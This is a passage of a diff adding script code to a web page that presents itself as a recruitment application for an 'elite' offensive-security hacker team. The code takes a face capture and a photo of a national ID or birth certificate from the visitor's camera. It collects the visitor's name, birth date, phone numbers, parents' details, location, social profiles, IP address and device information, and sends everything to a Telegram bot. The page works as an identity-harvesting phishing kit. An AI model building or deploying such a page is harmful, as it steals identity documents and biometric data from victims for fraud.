+        function retakeFaceScan() {
+            if (hasSubmitted) return;
+            
+            faceVideo.classList.add('hidden');
+            document.getElementById('retakeFaceScan').classList.add('hidden');
+            document.getElementById('startFaceScan').classList.remove('hidden');
+            scanInstruction.textContent = 'Click "Start Face Scan" to begin verification';
+            scanInstruction.style.color = '#ff3333';
+            progressFill.style.width = '0%';
+            progressText.textContent = '0% Complete';
+            faceImageData = null;
+            currentStep = 0;
+            faceScanProgress = 0;
+        }
+
+        // Document scanning system
+        const documentVideo = document.getElementById('documentVideo');
+
+        document.querySelectorAll('.document-option').forEach(option => {
+            option.addEventListener('click', () => {
+                if (hasSubmitted) return;
+                
+                document.querySelectorAll('.document-option').forEach(opt => opt.classList.remove('selected'));
+                option.classList.add('selected');
+                selectedDocumentType = option.dataset.option;
+                document.getElementById('documentScanSection').classList.remove('hidden');
+            });
+        });
+
+        document.getElementById('startDocumentScan').addEventListener('click', startDocumentScan);
+        document.getElementById('captureDocument').addEventListener('click', captureDocument);
+        document.getElementById('retakeDocument').addEventListener('click', retakeDocument);
+
+        async function startDocumentScan() {
+            if (hasSubmitted) return;
+            
+            try {
+                documentStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: 400, 
+                        height: 300,
+                        facingMode: 'environment' // Use back camera for documents
+                    } 
+                });
+                documentVideo.srcObject = documentStream;
+                document.getElementById('startDocumentScan').classList.add('hidden');
+                document.getElementById('captureDocument').classList.remove('hidden');
+                
+            } catch (error) {
+                // Fallback to front camera if back camera not available
+                try {
+                    documentStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            width: 400, 
+                            height: 300,
+                            facingMode: 'user'
+                        } 
+                    });
+                    documentVideo.srcObject = documentStream;
+                    document.getElementById('startDocumentScan').classList.add('hidden');
+                    document.getElementById('captureDocument').classList.remove('hidden');
+                } catch (fallbackError) {
+                    showMessage('❌ Error accessing camera: ' + fallbackError.message, 'error');
+                }
+            }
+        }
+
+        function captureDocument() {
+            if (hasSubmitted) return;
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = 400;
+            canvas.height = 300;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(documentVideo, 0, 0, 400, 300);
+            documentImageData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            // Stop camera
+            if (documentStream) {
+                documentStream.getTracks().forEach(track => track.stop());
+            }
+            
+            // Show preview
+            const img = document.createElement('img');
+            img.src = documentImageData;
+            img.style.maxWidth = '300px';
+            img.style.border = '3px solid #ff0000';
+            img.style.borderRadius = '12px';
+            img.style.margin = '15px';
+            document.getElementById('documentPreview').innerHTML = '';
+            document.getElementById('documentPreview').appendChild(img);
+            
+            document.getElementById('captureDocument').classList.add('hidden');
+            document.getElementById('retakeDocument').classList.remove('hidden');
+            
+            showMessage('✅ Document captured successfully!', 'success');
+        }
+
+        function retakeDocument() {
+            if (hasSubmitted) return;
+            
+            document.getElementById('documentPreview').innerHTML = '';
+            document.getElementById('retakeDocument').classList.add('hidden');
+            document.getElementById('startDocumentScan').classList.remove('hidden');
+            documentImageData = null;
+        }
+
+        // Terms modal functions
+        function openTermsModal() {
+            document.getElementById('termsModal').style.display = 'block';
+        }
+
+        function closeTermsModal() {
+            document.getElementById('termsModal').style.display = 'none';
+        }
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('termsModal');
+            if (event.target == modal) {
+                modal.style.display = 'none';
+            }
+        }
+
+        // Form submission
+        document.getElementById('recruitmentForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            if (hasSubmitted) {
+                showMessage('❌ This device has already submitted an application!', 'error');
+                return;
+            }
+            
+            // Validation
+            if (!faceImageData) {
+                showMessage('❌ Please complete face verification first!', 'error');
+                return;
+            }
+            
+            if (!selectedDocumentType || !documentImageData) {
+                showMessage('❌ Please complete document verification!', 'error');
+                return;
+            }
+            
+            if (!document.getElementById('termsAgree').checked) {
+                showMessage('❌ Please agree to the Terms and Conditions!', 'error');
+                return;
+            }
+            
+            // Show loading state
+            const submitBtn = document.querySelector('.submit-btn');
+            const originalText = submitBtn.innerHTML;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing Application...';
+            submitBtn.disabled = true;
+            
+            // Collect form data
+            const formData = new FormData(e.target);
+            const data = Object.fromEntries(formData.entries());
+            
+            // Get additional device/browser info
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Prepare message
+            let message = `🔥 <b>Team S-H-T- ADVANCED RECRUITMENT APPLICATION</b> 🔥\n\n`;
+            message += `🛡️ <b>ELITE MEMBER CANDIDATE - VERIFIED</b>\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+            message += `🌐 <b>SECURITY TRACKING INFO:</b>\n`;
+            message += `• <b>IP Address:</b> ${userIP}\n`;
+            message += `• <b>Submission Time:</b> ${deviceInfo.timestamp}\n`;
+            message += `• <b>Device Platform:</b> ${deviceInfo.platform}\n`;
+            message += `• <b>Browser Language:</b> ${deviceInfo.language}\n`;
+            message += `• <b>Screen Resolution:</b> ${deviceInfo.screenResolution}\n`;
+            message += `• <b>Timezone:</b> ${deviceInfo.timezone}\n\n`;
+            message += `👤 <b>PERSONAL INTEL:</b>\n`;
+            message += `• <b>Name:</b> ${data.name}\n`;
+            message += `• <b>Age:</b> ${data.age} years\n`;
+            message += `• <b>DOB:</b> ${data.dob}\n`;
+            message += `• <b>Primary Contact:</b> ${data.primaryNumber}\n`;
+            message += `• <b>Secondary Contact:</b> ${data.secondaryNumber || 'N/A'}\n`;
+            message += `• <b>Institute:</b> ${data.instituteName}\n`;
+            message += `• <b>ID Number:</b> ${data.nidOrBirth}\n`;
+            message += `• <b>Father:</b> ${data.fatherName} (${data.fatherNumber})\n`;
+            message += `• <b>Mother:</b> ${data.motherName}\n`;
+            message += `• <b>Location:</b> ${data.location}\n`;
+            message += `• <b>Facebook:</b> ${data.facebookProfile}\n`;
+            message += `• <b>Email:</b> ${data.gmail}\n\n`;
+            message += `🔐 <b>ADVANCED SECURITY VERIFICATION:</b>\n`;
+            message += `• ✅ <b>Multi-Step Biometric Face Scan:</b> COMPLETED\n`;
+            message += `• ✅ <b>Document Type:</b> ${selectedDocumentType === 'nid' ? 'National ID Card' : 'Birth Certificate'}\n`;
+            message += `• ✅ <b>Camera Document Verification:</b> COMPLETED\n`;
+            message += `• ✅ <b>Terms & Conditions:</b> ACCEPTED\n`;
+            message += `• ✅ <b>IP Tracking:</b> VERIFIED\n\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `⚡ <b>STATUS:</b> PENDING ELITE REVIEW\n`;
+            message += `🎯 <b>TEAM:</b> CYBER SLAYERS RECRUITMENT\n`;
+            message += `🔥 <b>MISSION:</b> OFFENSIVE SECURITY OPERATIONS\n`;
+            message += `🚨 <b>SECURITY NOTE:</b> One application per IP/device enforced`;
+            
+            try {
+                // Send text message
+                await sendToTelegram(BOT_TOKEN, USER_ID, message);
+                
+                // Send face image
+                await sendImageToTelegram(BOT_TOKEN, USER_ID, faceImageData, `🔐 BIOMETRIC VERIFICATION - IP: ${userIP}`);
+                
+                // Send document image
+                const docType = selectedDocumentType === 'nid' ? 'NATIONAL ID CARD' : 'BIRTH CERTIFICATE';
+                await sendImageToTelegram(BOT_TOKEN, USER_ID, documentImageData, `📄 ${docType} - IP: ${userIP}`);
+                
+                // Mark IP as submitted
+                markIPAsSubmitted();
+                hasSubmitted = true;
+                
+                showMessage('🎉 Application submitted successfully! Your IP has been recorded. Welcome to CYBER SLAYERS elite recruitment process!', 'success');
+                
+                // Disable form after successful submission
+                disableForm();
+                
+            } catch (error) {
+                showMessage('❌ Error submitting application: ' + error.message, 'error');
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
+            }
+        });
+
+        async function sendToTelegram(botToken, chatId, message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            if (!response.ok) {
+                const errorData = await response.json();
+                throw new Error(`Telegram API Error: ${errorData.description || 'Unknown error'}`);
+            }
+        }
+
+        async function sendImageToTelegram(botToken, chatId, imageData, caption) {
+            try {
+                const response = await fetch(imageData);
+                const blob = await response.blob();
+                
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'image.jpg');
+                formData.append('caption', caption);
+                
+                const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+                const telegramResponse = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (!telegramResponse.ok) {
+                    const errorData = await telegramResponse.json();
+                    throw new Error(`Failed to send ${caption}: ${errorData.description || 'Unknown error'}`);
+                }
+            } catch (error) {
+                console.error('Image upload error:', error);
+                throw error;
+            }
+        }
+
+        function showMessage(message, type) {
+            const statusDiv = document.getElementById('statusMessage');
+            statusDiv.innerHTML = message;
+            statusDiv.className = `status-message ${type}`;
+            
+            if (type === 'success') {
+                setTimeout(() => {
+                    statusDiv.innerHTML = '';
+                    statusDiv.className = '';
+                }, 10000);
+            }
+        }
+    </script>
+</body>
+</html>
